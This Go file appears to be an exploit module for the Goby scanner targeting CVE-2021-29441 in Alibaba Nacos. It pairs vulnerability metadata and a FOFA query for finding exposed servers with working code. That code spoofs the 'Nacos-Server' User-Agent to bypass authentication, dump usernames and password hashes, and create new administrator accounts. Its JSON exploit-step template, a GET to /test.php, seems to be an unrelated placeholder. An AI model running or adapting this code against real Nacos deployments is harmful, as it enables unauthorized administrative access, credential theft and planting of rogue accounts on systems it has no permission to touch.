package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>Nacos uses the AuthFilter servlet filter to enforce authentication. This filter can bypass authentication by modifying the user-agent to Nacos-Server. This problem may allow any user to perform any administrative tasks on the Nacos server.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2021-04-14",
    "Author": "rrarandom",
    "FofaQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "GobyQuery": "title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "Level": "2",
    "Impact": "<p>Nacos uses the AuthFilter servlet filter to enforce authentication. This filter can bypass authentication by modifying the user-agent to Nacos-Server. This problem may allow any user to perform any administrative tasks on the Nacos server.</p>",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "CVEID": [
        "CVE-2021-29441"
    ],
    "CNNVD": [
        "CNNVD-202104-2002"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Is0day": false,
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/alibaba/nacos/releases\">https://github.com/alibaba/nacos/releases</a></p>",
    "Translation": {
        "CN": {
            "Name": "Nacos Nacos-Server 权限绕过漏洞（CVE-2021-29441）",
            "Product": "NACOS",
            "Description": "<p>Nacos 是构建云原生应用的动态服务发现、配置管理和服务管理的平台。</p><p>Nacos 使用 AuthFilter servlet 过滤器来强制身份验证，此过滤器可以通过修改 user-agent 为 Nacos-Server 绕过身份认证，此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新: <a href=\"https://github.com/alibaba/nacos/releases\" target=\"_blank\">https://github.com/alibaba/nacos/releases</a><br></p>",
            "Impact": "<p>Nacos 存在未授权访问漏洞，可以通过修改 user-agent 绕过身份认证，此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Nacos Nacos-Server Permission Bypass Vulnerability (CVE-2021-29441)",
            "Product": "NACOS",
            "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>Nacos uses the AuthFilter servlet filter to enforce authentication. This filter can bypass authentication by modifying the user-agent to Nacos-Server. This problem may allow any user to perform any administrative tasks on the Nacos server.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/alibaba/nacos/releases\" target=\"_blank\">https://github.com/alibaba/nacos/releases</a><br></p>",
            "Impact": "<p>Nacos uses the AuthFilter servlet filter to enforce authentication. This filter can bypass authentication by modifying the user-agent to Nacos-Server. This problem may allow any user to perform any administrative tasks on the Nacos server.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "References": [
        "https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "listUser,addUser",
            "show": ""
        },
        {
            "name": "addUser",
            "type": "select",
            "value": "auto,custom",
            "show": "attackType=addUser"
        },
        {
            "name": "username",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        },
        {
            "name": "password",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "POST",
                "uri": "",
                "header": {}
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CVEIDs": [
        "CVE-2021-29441"
    ],
    "Name": "Nacos Nacos-Server Permission Bypass Vulnerability (CVE-2021-29441)",
    "PostTime": "2023-08-08",
    "PocId": "10831"
}`
	addUserFlagCm6r := func(hostInfo *httpclient.FixUrl, username, password string) (*httpclient.HttpResponse, error) {
		uris := []string{`/nacos/v1/auth/users?username={{username}}&password={{password}}`, `/v1/auth/users?username={{username}}&password={{password}}`}
		for _, uri := range uris {
			uri = strings.ReplaceAll(uri, `{{username}}`, username)
			uri = strings.ReplaceAll(uri, `{{password}}`, password)
			addUserRequest := httpclient.NewPostRequestConfig(uri)
			addUserRequest.VerifyTls = false
			addUserRequest.FollowRedirect = false
			addUserRequest.Header.Store("User-Agent", "Nacos-Server")
			rsp, err := httpclient.DoHttpRequest(hostInfo, addUserRequest)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	listUserFlagCm6r := func(hostInfo *httpclient.FixUrl) ([]string, error) {
		uris := []string{`/nacos/v1/auth/users?pageNo=1&pageSize=9`, `/v1/auth/users?pageNo=1&pageSize=9`}
		for _, uri := range uris {
			listUserRequestConfig := httpclient.NewGetRequestConfig(uri)
			listUserRequestConfig.VerifyTls = false
			listUserRequestConfig.FollowRedirect = false
			listUserRequestConfig.Header.Store("User-Agent", "Nacos-Server")
			rsp, err := httpclient.DoHttpRequest(hostInfo, listUserRequestConfig)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			// json 反序列化
			var data map[string]interface{}
			err = json.Unmarshal([]byte(rsp.Utf8Html), &data)
			var userList []string
			if err != nil {
				continue
			}
			pageItems, ok := data["pageItems"].([]interface{})
			if !ok {
				continue
			}
			for _, item := range pageItems {
				itemData, ok := item.(map[string]interface{})
				if !ok {
					continue
				}
				username, ok := itemData["username"].(string)
				if !ok {
					continue
				}
				password, ok := itemData["password"].(string)
				if !ok {
					continue
				}
				userList = append(userList, username+"\t"+password)
			}
			return userList, nil
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			userList, err := listUserFlagCm6r(hostInfo)
			if err != nil || userList == nil {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			username := goutils.B2S(ss.Params["username"])
			password := goutils.B2S(ss.Params["password"])
			adduser := goutils.B2S(ss.Params["addUser"])
			if attackType == "listUser" {
				userList, err := listUserFlagCm6r(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Output = strings.Join(userList, "\n")
				expResult.Success = true
			} else if attackType == "addUser" {
				if adduser == "auto" {
					username = goutils.RandomHexString(16)
					password = goutils.RandomHexString(16)
				}
				rsp, err := addUserFlagCm6r(expResult.HostInfo, username, password)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if strings.Contains(rsp.Utf8Html, `create user ok!`) {
					expResult.Success = true
					expResult.Output = `username: ` + username + "\npassword: " + password
				} else {
					expResult.Success = false
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}
